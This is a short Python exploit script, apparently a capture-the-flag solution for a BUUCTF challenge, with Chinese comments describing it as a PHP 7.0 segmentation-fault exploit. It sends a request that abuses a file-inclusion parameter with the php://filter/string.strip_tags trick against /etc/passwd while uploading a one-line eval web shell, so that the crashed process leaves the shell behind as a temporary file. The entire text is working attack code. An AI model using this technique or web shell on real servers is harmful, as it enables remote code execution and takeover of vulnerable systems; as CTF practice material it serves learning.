#php7.0的segment fault利用
import requests

url='http://a51f794e-e97a-493c-b28b-a7f6d7ec52a2.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'
file = {'file':('aa.php','<?php @eval($_POST[cmd])?>')}
res = requests.post(url=url, files=file)
print(res.text)      #估计是无响应
